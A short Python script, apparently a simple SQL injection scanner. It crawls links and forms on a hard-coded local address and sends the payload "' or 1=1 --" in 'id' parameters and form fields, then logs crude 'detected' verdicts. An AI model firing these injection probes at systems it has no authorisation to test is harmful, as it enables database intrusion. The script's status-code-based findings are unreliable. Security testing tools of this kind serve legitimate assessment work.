import requests
from urllib import parse
from bs4 import BeautifulSoup


# What can be detected? <a href="/somelink?id=1">, <form action="/someformlink" method="post">
# What cannot be detected? <a href="/" click=someJavascriptMethod()>.
# However, this can still be logged for investigation

def detect(address, port):
    logs = []

    if not address.startswith("http://"):
        address = "http://" + address

    full_address = address + ":" + port
    # Make a request to the website
    response = requests.get(full_address)

    # Parse the HTML content of the page
    soup = BeautifulSoup(response.content, "html.parser")

    # Find all tags with href attribute
    href_tags = soup.find_all(href=True)
    for tag in href_tags:
        href = tag['href']
        if not href.startswith("/"):
            href = "/" + href
        sub_address = full_address + href
        logs.append('[get][HREF] ' + sub_address)
        # check wether the link has request param
        url_splits = parse.urlsplit(sub_address)
        params_raw = url_splits.query.split("&") if url_splits.query else []
        if len(params_raw) > 0:
            params = dict()
            for param in params_raw:
                params[param.split("=")[0]] = param.split("=")[1]
            potential = False
            for key, value in params.items():
                if key.lower().find('id') >= 0:
                    potential = True
                    params[key] = params[key] + "' or 1=1 --"
            if potential:
                # rebuild the dict into a query string
                query_string = parse.urlencode(params)
                sub_address_wo_query = sub_address.split("?")
                new_sub_address = sub_address_wo_query[0] + "?" + query_string
                response = requests.get(new_sub_address)
                if response.status_code == 200:
                    logs.append("[SQL Injection detected][potential] " + new_sub_address)
                else:
                    logs.append("[Not working][1] " + new_sub_address)

    # Find all forms with action attribute
    forms = soup.find_all('form')
    for form in forms:
        method = 'post'
        if form['method']:
            method = form['method']
        action = form['action']
        if not action.startswith("/"):
            action = "/" + action
        sub_address = full_address + action
        logs.append('[' + method + '][FORM] ' + sub_address)
        children = form.findChildren("input", recursive=False)
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = dict()
        param_no = 1
        for child in children:
            value = 'user1'
            if param_no == 1:
                value += "' or 1=1 --"
            payload[child.attrs['name']] = value
            param_no += 1

        session = requests.Session()
        if method.lower() == 'post':
            p_response = session.post(sub_address, headers=headers, data=payload)
        elif method.lower() == 'put':
            p_response = session.put(sub_address, headers=headers, data=payload)
        else:
            print('ambiguous form ' + sub_address + '\n')
            return -1
        if p_response.status_code == 200:
            soup2 = BeautifulSoup(p_response.content, "html.parser")
            forms2 = soup2.find_all('form')
            if len(forms2) == 0:
                logs.append("[SQL Injection detected]" + sub_address)
            else:
                for form2 in forms2:
                    if form2['action'] == form['action']:
                        logs.append("[Not working][0] " + sub_address)
                    else:
                        logs.append("[SQL Injection detected] " + sub_address)
        else:
            logs.append("[Not working][1] " + sub_address)

    if len(logs) > 0:
        f = open("sql_injection.txt", "w")
        for log in logs:
            f.write(log + "\n")
        f.close()


if __name__ == "__main__":
    detect("192.168.0.15", "80")
